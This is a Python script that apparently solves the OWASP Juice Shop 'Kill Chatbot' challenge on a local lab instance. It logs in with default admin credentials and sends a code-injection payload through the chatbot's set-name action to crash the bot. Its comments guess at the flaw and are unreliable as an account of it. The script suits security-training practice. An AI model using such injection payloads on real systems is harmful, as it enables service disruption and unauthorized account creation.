
import requests
import json
import logging

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger()

SERVER = 'http://localhost:3000'

def login_as_admin(server):
    # Retrieve admin token first as chatbot usually requires logged in user
    s = requests.Session()
    try:
        res = s.post(f'{server}/rest/user/login', json={
            "email": "admin@juice-sh.op",
            "password": "admin123"
        })
        if res.ok:
            data = res.json()
            token = data.get('authentication', {}).get('token')
            if token:
                s.headers.update({'Authorization': f'Bearer {token}'})
                logger.info(f"Logged in as Admin. Token: {token[:20]}...")
            else:
                logger.warning("Logged in but no token found!")
            return s
        else:
            logger.error("Failed to login as admin.")
            return s 
    except:
        return s

def debug_kill_chatbot():
    print('Debugging Chatbot Kill...')
    
    # 1. Login
    session = login_as_admin(SERVER)
    
    # 2. Analyze
    # The chatbot is likely a recursive function or state machine.
    # The hint mentions "juice-shop relies on a third party... library".
    # And "get a hold of the bot's source".
    # This often refers to the 'Juicy Chatbot' library which had a vulnerability.
    
    # Payload for 'juicy-chat-bot' Prototype Pollution or RCE?
    # Actually, the known solution for "Kill Chatbot" in Juice Shop involves 
    # overloading the logic or injecting something that breaks the response generation loop.
    
    # Common solution: 
    # The chatbot has a 'processQuery' function. If we can set it to null, it crashes.
    # We can do this if the bot reflects our username into a `eval` or similar context 
    # inside the library (vm2 sandbox escape or similar?).
    
    # The username setting action is: { "action": "setname", "query": "myname" }
    
    # Payload:
    # 1. Login/Set name to attack string
    # String: `admin"); processQuery=null; users.addUser("1337", "test`
    # This looks like it's trying to close a function call and overwrite a global variable.
    
    attack_payload = 'admin"); process = null; users.addUser("1337", "test'
    # Wait, the official solution usually is:
    # `admin"); processQuery=null;`
    # Because the code does: `checkAuth("${name}")` ??
    
    # Let's try the Payload from 'advanced.py' first:
    payload_v1 = 'admin"); processQuery=null; users.addUser("1337", "test'
    
    # Let's try setting name
    logger.info(f"Sending payload: {payload_v1}")
    res = session.post(f'{SERVER}/rest/chatbot/respond', json={'action': 'setname', 'query': payload_v1})
    logger.info(f"Setname Status: {res.status_code}")
    logger.info(f"Response: {res.text}")
    
    # Now trigger the crash by asking something
    logger.info("Triggering interaction...")
    res = session.post(f'{SERVER}/rest/chatbot/respond', json={'action': 'query', 'query': 'hello'})
    logger.info(f"Query Status: {res.status_code}")
    logger.info(f"Response: {res.text}")
    
    if res.status_code == 500:
        logger.info("SUCCESS! Chatbot returned 500 (Killed).")
    else:
        logger.info("Chatbot still alive.")

if __name__ == '__main__':
    debug_kill_chatbot()
